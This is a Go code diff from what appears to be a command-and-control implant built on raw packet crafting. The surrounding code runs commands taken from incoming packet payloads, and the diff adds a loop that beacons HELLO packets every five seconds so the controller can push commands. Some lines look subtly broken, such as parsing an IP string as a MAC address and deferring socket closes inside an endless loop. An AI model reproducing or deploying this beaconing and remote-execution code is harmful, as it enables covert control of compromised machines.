@@ -510,6 +510,12 @@ func serverProcessPacket(packet gopacket.Packet, listen chan Host) {
 	cmd := payload[4]
 	execCommand(cmd)
 
+	//get ping command
+	ping := payload[5]
+	if ping != nil {
+		iface, myIP := GetOutwardIface("8.8.8.8:80")
+		go sendHello(iface, src, net.ParseIP(packet.NetworkLayer().NetworkFlow().Src().String()), net.ParseMAC(packet.NetworkLayer().NetworkFlow().Src().String()))
+	}
 	srcport, _ := strconv.Atoi(packet.TransportLayer().TransportFlow().Src().String())
 	dstport, _ := strconv.Atoi(packet.TransportLayer().TransportFlow().Dst().String())
 
@@ -526,6 +532,34 @@ func serverProcessPacket(packet gopacket.Packet, listen chan Host) {
 	if debugCheck != "" { fmt.Println("[+] Recieved From:", newHost.Hostname, "(", newHost.IP, ")") }
 	// Write host to channel
 	listen <- newHost
+}
+
+// Continuously send HELLO messages so that the C2 can respond with commands
+func sendHello(iface *net.Interface, src net.IP, dst net.IP, dstMAC net.HardwareAddr) {
+	for {
+		fd := NewSocket()
+		defer unix.Close(fd)
+		if debugCheck != "" { fmt.Println("[+] iface:", iface) }
+		if debugCheck != "" { fmt.Println("[+] src:", src) }
+		if debugCheck != "" { fmt.Println("[+] dst:", dst) }
+		if debugCheck != "" { fmt.Println("[+] dstMac:", dstMAC) }
+		
+		
+		packet := CreatePacket(iface, src, dst, 47135, 80, dstMAC, CreateHello(iface.HardwareAddr, src))
+		tmpPacket := gopacket.NewPacket(packet, layers.LayerTypeEthernet, gopacket.Default)
+		//data := string(packet.ApplicationLayer().Payload())
+		
+		if debugCheck != "" { fmt.Println("[+] packet:", tmpPacket.String()) }
+
+		addr := CreateAddrStruct(iface)
+		
+		if debugCheck != "" { fmt.Println("[+] addr:", addr) }
+
+		SendPacket(fd, iface, addr, packet)
+		if debugCheck != "" { fmt.Println("[+] Sent HELLO to:", dst) }
+		// Send hello every 5 seconds
+		time.Sleep(5 * time.Second)
+	}
 }
 
 // Simple CLI to update the "stagedCmd" value
